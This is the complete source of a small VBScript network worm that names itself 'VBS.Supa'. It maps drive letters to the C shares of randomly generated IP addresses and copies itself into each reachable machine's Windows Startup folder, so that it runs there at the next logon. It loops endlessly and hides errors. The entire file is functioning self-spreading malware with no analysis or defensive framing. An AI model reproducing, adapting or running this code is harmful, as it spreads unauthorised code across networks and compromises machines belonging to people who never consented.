randomize
name="VBS.Supa, tiny VBS shares worm"
set o=createobject("wscript.network")
set b=createobject("scripting.filesystemobject")
g=b.GetFile(wscript.scriptfullname)
p="."
l="x:"
on error resume next
do
w=int(254*rnd)
x=int(254*rnd)
y=int(254*rnd)
z=0
do while z<254
z=z+1
o.mapnetworkdrive l,"\\"&w&p&x&p&y&p&z&"\C"
b.copyfile g,l&"\WINDOWS\StartM~1\Programs\StartUp"
o.removenetworkdrive l
loop
loop